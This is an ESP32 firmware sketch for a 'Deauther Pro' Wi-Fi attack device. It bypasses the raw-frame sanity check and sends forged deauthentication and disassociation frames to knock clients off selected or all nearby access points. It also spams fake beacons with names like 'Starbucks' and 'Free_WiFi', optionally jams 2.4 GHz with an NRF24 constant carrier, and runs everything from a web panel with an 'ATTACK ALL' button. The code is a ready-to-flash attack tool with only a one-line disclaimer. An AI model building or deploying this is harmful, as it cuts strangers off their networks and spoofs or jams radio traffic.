
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"

#define USE_NRF24 0
#define STATUS_LED 2
#define MAX_TARGETS 32
#define MAX_SCAN 40

#if USE_NRF24
  #include <SPI.h>
  #include <RF24.h>
  #define NRF_CE_PIN  22
  #define NRF_CSN_PIN 21
  RF24 radio(NRF_CE_PIN, NRF_CSN_PIN);
  bool nrfReady = false;
  bool nrfJamming = false;
#endif

const char* AP_SSID = "Wolf Attacker";
const char* AP_PASS = "Tamil123";

DNSServer dnsServer;
WebServer server(80);
const byte DNS_PORT = 53;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

// --- Frame templates ---
uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

uint8_t disassocFrame[26] = {
  0xA0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x01, 0x00
};

uint8_t beaconFrame[128];

enum AttackMode { MODE_DEAUTH = 0, MODE_DISASSOC = 1, MODE_BOTH = 2, MODE_BEACON = 3 };

struct NetInfo {
  String  ssid;
  uint8_t bssid[6];
  String  bssidStr;
  uint8_t channel;
  int32_t rssi;
  wifi_auth_mode_t enc;
  bool selected;
};

NetInfo nets[MAX_SCAN];
int scannedCount = 0;

bool attacking = false;
AttackMode attackMode = MODE_BOTH;
int intensity = 8;
unsigned long packetsSent = 0;
unsigned long attackStartMs = 0;
unsigned long lastPktMs = 0;
unsigned long pktsLastSec = 0;
unsigned long pktsWindow = 0;
int currentAttackCh = 1;
String attackLabel = "";

const char* encName(wifi_auth_mode_t m) {
  switch (m) {
    case WIFI_AUTH_OPEN:            return "OPEN";
    case WIFI_AUTH_WEP:             return "WEP";
    case WIFI_AUTH_WPA_PSK:         return "WPA";
    case WIFI_AUTH_WPA2_PSK:        return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
    case WIFI_AUTH_WPA3_PSK:        return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/3";
    default:                        return "?";
  }
}

const char* modeName(AttackMode m) {
  switch (m) {
    case MODE_DEAUTH:   return "DEAUTH";
    case MODE_DISASSOC: return "DISASSOC";
    case MODE_BOTH:     return "DEAUTH+DISASSOC";
    case MODE_BEACON:   return "BEACON SPAM";
    default:            return "?";
  }
}

void setLed(bool on) { digitalWrite(STATUS_LED, on ? HIGH : LOW); }

void doScan() {
  attacking = false;
  setLed(false);
  WiFi.mode(WIFI_AP_STA);
  int n = WiFi.scanNetworks(false, true);
  scannedCount = 0;
  for (int i = 0; i < n && scannedCount < MAX_SCAN; i++) {
    nets[scannedCount].ssid = WiFi.SSID(i);
    memcpy(nets[scannedCount].bssid, WiFi.BSSID(i), 6);
    nets[scannedCount].bssidStr = WiFi.BSSIDstr(i);
    nets[scannedCount].channel = WiFi.channel(i);
    nets[scannedCount].rssi = WiFi.RSSI(i);
    nets[scannedCount].enc = WiFi.encryptionType(i);
    nets[scannedCount].selected = false;
    scannedCount++;
  }
  for (int i = 0; i < scannedCount - 1; i++) {
    for (int j = i + 1; j < scannedCount; j++) {
      if (nets[j].rssi > nets[i].rssi) {
        NetInfo t = nets[i];
        nets[i] = nets[j];
        nets[j] = t;
      }
    }
  }
}

int selectedCount() {
  int c = 0;
  for (int i = 0; i < scannedCount; i++) if (nets[i].selected) c++;
  return c;
}

void fillApAddrs(uint8_t* frame, const uint8_t* bssid) {
  memcpy(&frame[10], bssid, 6);
  memcpy(&frame[16], bssid, 6);
}

void sendMgmtBurst(const uint8_t* bssid, uint8_t ch) {
  fillApAddrs(deauthFrame, bssid);
  fillApAddrs(disassocFrame, bssid);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  currentAttackCh = ch;

  int bursts = constrain(intensity, 1, 32);
  for (int i = 0; i < bursts; i++) {
    if (attackMode == MODE_DEAUTH || attackMode == MODE_BOTH) {
      esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
      packetsSent++;
      pktsWindow++;
    }
    if (attackMode == MODE_DISASSOC || attackMode == MODE_BOTH) {
      esp_wifi_80211_tx(WIFI_IF_AP, disassocFrame, sizeof(disassocFrame), false);
      packetsSent++;
      pktsWindow++;
    }
  }
}

void buildBeacon(const String& ssid, const uint8_t* bssid, uint8_t ch) {
  memset(beaconFrame, 0, sizeof(beaconFrame));
  beaconFrame[0] = 0x80;
  beaconFrame[1] = 0x00;
  memset(&beaconFrame[4], 0xFF, 6);
  memcpy(&beaconFrame[10], bssid, 6);
  memcpy(&beaconFrame[16], bssid, 6);
  beaconFrame[32] = 0x64;
  beaconFrame[33] = 0x00;
  beaconFrame[34] = 0x01;
  beaconFrame[35] = 0x04;
  int pos = 36;
  beaconFrame[pos++] = 0x00;
  uint8_t len = (uint8_t)min((int)ssid.length(), 32);
  beaconFrame[pos++] = len;
  for (uint8_t i = 0; i < len; i++) beaconFrame[pos++] = (uint8_t)ssid.charAt(i);
  beaconFrame[pos++] = 0x01; beaconFrame[pos++] = 0x08;
  beaconFrame[pos++] = 0x82; beaconFrame[pos++] = 0x84;
  beaconFrame[pos++] = 0x8b; beaconFrame[pos++] = 0x96;
  beaconFrame[pos++] = 0x24; beaconFrame[pos++] = 0x30;
  beaconFrame[pos++] = 0x48; beaconFrame[pos++] = 0x6c;
  beaconFrame[pos++] = 0x03; beaconFrame[pos++] = 0x01; beaconFrame[pos++] = ch;
  beaconFrame[127] = (uint8_t)pos;
}

void sendBeaconSpam() {
  static uint8_t fakeMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01};
  static const char* fakeNames[] = {
    "Free_WiFi", "Airport_Free", "Starbucks", "Hotel_Guest",
    "Public_WiFi", "AndroidAP", "iPhone", "TP-LINK_Guest",
    "DIRECT-TV", "xfinitywifi", "ATT-WiFi", "McDonalds_Free"
  };
  static int nameIdx = 0;

  fakeMac[5]++;
  if (fakeMac[5] == 0) fakeMac[4]++;

  uint8_t ch = 1 + (nameIdx % 13);
  String name = fakeNames[nameIdx % 12];
  nameIdx++;

  buildBeacon(name, fakeMac, ch);
  uint8_t flen = beaconFrame[127];
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  currentAttackCh = ch;

  int bursts = constrain(intensity, 1, 32);
  for (int i = 0; i < bursts; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, flen, false);
    packetsSent++;
    pktsWindow++;
  }
}

void runAttackTick() {
  if (attackMode == MODE_BEACON) {
    sendBeaconSpam();
    attackLabel = "BEACON SPAM";
    return;
  }

  int sel = selectedCount();
  if (sel == 0) {
    attacking = false;
    setLed(false);
    return;
  }

  attackLabel = String(sel) + " target(s)";
  for (int i = 0; i < scannedCount; i++) {
    if (!nets[i].selected) continue;
    sendMgmtBurst(nets[i].bssid, nets[i].channel);
  }
}

#if USE_NRF24
void nrfInit() {
  if (radio.begin()) {
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);
    radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    nrfReady = true;
  }
}
void nrfHop() {
  static uint8_t ch = 0;
  ch = (ch + 1) % 80;
  radio.setChannel(ch);
  radio.startConstCarrier(RF24_PA_MAX, ch);
}
#endif

String htmlEscape(const String& s) {
  String o;
  for (unsigned i = 0; i < s.length(); i++) {
    char c = s.charAt(i);
    if (c == '<') o += "&lt;";
    else if (c == '>') o += "&gt;";
    else if (c == '&') o += "&amp;";
    else if (c == '"') o += "&quot;";
    else o += c;
  }
  return o;
}

String htmlPage() {
  unsigned long uptime = millis() / 1000;
  unsigned long atkSec = attacking ? (millis() - attackStartMs) / 1000 : 0;

  String p;
  p.reserve(12000);
  p += F("<!DOCTYPE html><html><head><meta charset='utf-8'>");
  p += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
  p += F("<title>ESP32 Deauther Pro</title><style>");
  p += F("*{box-sizing:border-box}");
  p += F("body{background:#fff;color:#111;font-family:Arial,Helvetica,sans-serif;margin:0;padding:14px}");
  p += F("h1{color:#c62828;text-align:center;margin:4px 0;font-size:26px}");
  p += F(".sub{text-align:center;color:#666;font-size:13px;margin-bottom:10px}");
  p += F(".warn{background:#fff3e0;color:#e65100;border:1px solid #ffcc80;padding:8px;border-radius:6px;font-size:12px;text-align:center;margin-bottom:10px}");
  p += F(".card{background:#fafafa;border:1px solid #eee;border-radius:8px;padding:12px;margin:10px 0}");
  p += F(".status{text-align:center;font-weight:bold;padding:10px;border-radius:6px}");
  p += F(".on{background:#ffcdd2;color:#b71c1c}.off{background:#e8f5e9;color:#1b5e20}");
  p += F(".stats{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:8px}");
  p += F(".chip{background:#fff;border:1px solid #ddd;border-radius:6px;padding:6px 10px;font-size:12px}");
  p += F(".chip b{color:#c62828}");
  p += F(".bar{text-align:center;margin:10px 0}");
  p += F(".btn{background:#e53935;color:#fff;border:none;padding:10px 14px;margin:4px;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer}");
  p += F(".btn:hover{background:#b71c1c}");
  p += F(".btn.grey{background:#616161}.btn.grey:hover{background:#424242}");
  p += F(".btn.dark{background:#212121}");
  p += F(".pick{background:#e53935;color:#fff;border:none;padding:5px 10px;border-radius:5px;cursor:pointer;font-size:12px;font-weight:bold}");
  p += F("table{width:100%;border-collapse:collapse;background:#fff;font-size:13px}");
  p += F("th,td{border:1px solid #ddd;padding:7px;text-align:left}");
  p += F("th{background:#f5f5f5;color:#c62828}");
  p += F("tr.sel{background:#ffebee}");
  p += F("label{font-size:13px;margin-right:8px}");
  p += F("select,input[type=number]{padding:6px;border:1px solid #ccc;border-radius:5px;margin:2px}");
  p += F(".row{display:flex;flex-wrap:wrap;gap:8px;align-items:center;justify-content:center}");
  p += F("</style></head><body>");

  p += F("<h1>ESP32 Deauther Pro</h1>");
  p += F("<div class='sub'>Scan &middot; Multi-target &middot; Deauth / Disassoc / Beacon &middot; Jam</div>");
  p += F("<div class='warn'>Authorized testing only. Attacking networks you do not own is illegal.</div>");

  p += F("<div class='card'>");
  if (attacking) {
    p += F("<div class='status on'>ATTACKING &mdash; ");
    p += modeName(attackMode);
    p += F(" &mdash; ");
    p += htmlEscape(attackLabel);
    p += F("</div>");
  } else {
    p += F("<div class='status off'>IDLE &mdash; ready</div>");
  }
  p += F("<div class='stats'>");
  p += "<div class='chip'>Packets <b>" + String(packetsSent) + "</b></div>";
  p += "<div class='chip'>Rate <b>" + String(pktsLastSec) + "</b>/s</div>";
  p += "<div class='chip'>Channel <b>" + String(currentAttackCh) + "</b></div>";
  p += "<div class='chip'>Selected <b>" + String(selectedCount()) + "</b></div>";
  p += "<div class='chip'>Scanned <b>" + String(scannedCount) + "</b></div>";
  p += "<div class='chip'>Attack time <b>" + String(atkSec) + "s</b></div>";
  p += "<div class='chip'>Uptime <b>" + String(uptime) + "s</b></div>";
#if USE_NRF24
  p += "<div class='chip'>NRF24 <b>";
  p += nrfReady ? (nrfJamming ? "JAMMING" : "READY") : "OFF";
  p += "</b></div>";
#endif
  p += F("</div></div>");

  p += F("<div class='card'><form method='GET' action='/settings'><div class='row'>");
  p += F("<label>Mode <select name='mode'>");
  p += String("<option value='0'") + (attackMode == MODE_DEAUTH ? " selected" : "") + ">DEAUTH</option>";
  p += String("<option value='1'") + (attackMode == MODE_DISASSOC ? " selected" : "") + ">DISASSOC</option>";
  p += String("<option value='2'") + (attackMode == MODE_BOTH ? " selected" : "") + ">BOTH</option>";
  p += String("<option value='3'") + (attackMode == MODE_BEACON ? " selected" : "") + ">BEACON SPAM</option>";
  p += F("</select></label>");
  p += F("<label>Intensity <input type='number' name='int' min='1' max='32' value='");
  p += String(intensity);
  p += F("'></label>");
  p += F("<button class='btn' type='submit'>APPLY</button>");
  p += F("</div></form></div>");

  p += F("<div class='bar'>");
  p += F("<a href='/scan'><button class='btn'>SCAN WIFI</button></a>");
  p += F("<a href='/selectall'><button class='btn dark'>SELECT ALL</button></a>");
  p += F("<a href='/clear'><button class='btn grey'>CLEAR</button></a>");
  p += F("<a href='/attack'><button class='btn'>JAM / DEAUTH</button></a>");
  p += F("<a href='/attackall'><button class='btn'>ATTACK ALL</button></a>");
  p += F("<a href='/stop'><button class='btn grey'>STOP</button></a>");
#if USE_NRF24
  p += F("<a href='/nrf'><button class='btn'>");
  p += nrfJamming ? "NRF STOP" : "NRF JAM";
  p += F("</button></a>");
#endif
  p += F("</div>");

  p += F("<div class='card' style='padding:0;overflow-x:auto'>");
  p += F("<table><tr><th>Sel</th><th>#</th><th>SSID</th><th>Ch</th><th>RSSI</th><th>Enc</th><th>BSSID</th><th>Action</th></tr>");
  for (int i = 0; i < scannedCount; i++) {
    p += nets[i].selected ? F("<tr class='sel'>") : F("<tr>");
    p += "<td><a href='/toggle?id=" + String(i) + "'>" + (nets[i].selected ? "[X]" : "[ ]") + "</a></td>";
    p += "<td>" + String(i) + "</td>";
    String ssid = nets[i].ssid.length() ? htmlEscape(nets[i].ssid) : "<i>(hidden)</i>";
    p += "<td>" + ssid + "</td>";
    p += "<td>" + String(nets[i].channel) + "</td>";
    p += "<td>" + String(nets[i].rssi) + "</td>";
    p += "<td>" + String(encName(nets[i].enc)) + "</td>";
    p += "<td>" + nets[i].bssidStr + "</td>";
    p += "<td><a href='/attackone?id=" + String(i) + "'><button class='pick'>JAM / DEAUTH</button></a></td>";
    p += F("</tr>");
  }
  p += F("</table></div>");

  if (scannedCount == 0)
    p += F("<p style='text-align:center;color:#888'>No networks yet. Press <b>SCAN WIFI</b>.</p>");

  p += F("<p class='sub'>Auto-refresh every 2s while attacking. Sorted by strongest signal.</p>");
  if (attacking) p += F("<script>setTimeout(()=>location='/',2000);</script>");
  p += F("</body></html>");
  return p;
}

void redirectHome() {
  server.sendHeader("Location", "/");
  server.send(303);
}

void handleRoot() { server.send(200, "text/html", htmlPage()); }

void handleScan() {
  doScan();
  redirectHome();
}

void handleStop() {
  attacking = false;
  setLed(false);
#if USE_NRF24
  if (nrfReady && nrfJamming) {
    radio.stopConstCarrier();
    nrfJamming = false;
  }
#endif
  redirectHome();
}

void handleSettings() {
  if (server.hasArg("mode")) {
    int m = server.arg("mode").toInt();
    if (m >= 0 && m <= 3) attackMode = (AttackMode)m;
  }
  if (server.hasArg("int")) {
    intensity = constrain(server.arg("int").toInt(), 1, 32);
  }
  redirectHome();
}

void handleToggle() {
  if (server.hasArg("id")) {
    int id = server.arg("id").toInt();
    if (id >= 0 && id < scannedCount) nets[id].selected = !nets[id].selected;
  }
  redirectHome();
}

void handleSelectAll() {
  for (int i = 0; i < scannedCount; i++) nets[i].selected = true;
  redirectHome();
}

void handleClear() {
  for (int i = 0; i < scannedCount; i++) nets[i].selected = false;
  redirectHome();
}

void startAttack() {
  packetsSent = 0;
  pktsWindow = 0;
  pktsLastSec = 0;
  lastPktMs = millis();
  attackStartMs = millis();
  attacking = true;
  setLed(true);
}

void handleAttack() {
  if (attackMode == MODE_BEACON || selectedCount() > 0) startAttack();
  redirectHome();
}

void handleAttackAll() {
  for (int i = 0; i < scannedCount; i++) nets[i].selected = true;
  if (scannedCount > 0 || attackMode == MODE_BEACON) startAttack();
  redirectHome();
}

void handleAttackOne() {
  if (server.hasArg("id")) {
    int id = server.arg("id").toInt();
    if (id >= 0 && id < scannedCount) {
      for (int i = 0; i < scannedCount; i++) nets[i].selected = false;
      nets[id].selected = true;
      startAttack();
    }
  }
  redirectHome();
}

#if USE_NRF24
void handleNrf() {
  if (!nrfReady) { redirectHome(); return; }
  nrfJamming = !nrfJamming;
  if (nrfJamming) radio.startConstCarrier(RF24_PA_MAX, 45);
  else radio.stopConstCarrier();
  redirectHome();
}
#endif

void setup() {
  Serial.begin(115200);
  pinMode(STATUS_LED, OUTPUT);
  setLed(false);
  delay(200);
  Serial.println("\n[ESP32 Deauther Pro] booting...");

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(AP_SSID, AP_PASS);
  IPAddress apIP = WiFi.softAPIP();
  Serial.print("AP IP: ");
  Serial.println(apIP);

  // Captive portal: any domain (e.g. google.com) resolves to this ESP32
  dnsServer.start(DNS_PORT, "*", apIP);

  esp_wifi_set_max_tx_power(84);

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/stop", handleStop);
  server.on("/settings", handleSettings);
  server.on("/toggle", handleToggle);
  server.on("/selectall", handleSelectAll);
  server.on("/clear", handleClear);
  server.on("/attack", handleAttack);
  server.on("/attackall", handleAttackAll);
  server.on("/attackone", handleAttackOne);
#if USE_NRF24
  server.on("/nrf", handleNrf);
#endif
  // Serve UI for any URL/host (http://google.com, captive checks, etc.)
  server.onNotFound(handleRoot);
  server.begin();
  Serial.println("Web UI -> http://google.com  (or http://192.168.4.1)");

#if USE_NRF24
  nrfInit();
  Serial.println(nrfReady ? "NRF24 ready" : "NRF24 not found");
#endif
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (millis() - lastPktMs >= 1000) {
    pktsLastSec = pktsWindow;
    pktsWindow = 0;
    lastPktMs = millis();
  }

  if (attacking) {
    runAttackTick();
    setLed((millis() / 200) % 2);
  }

#if USE_NRF24
  if (nrfReady && nrfJamming) nrfHop();
#endif
}
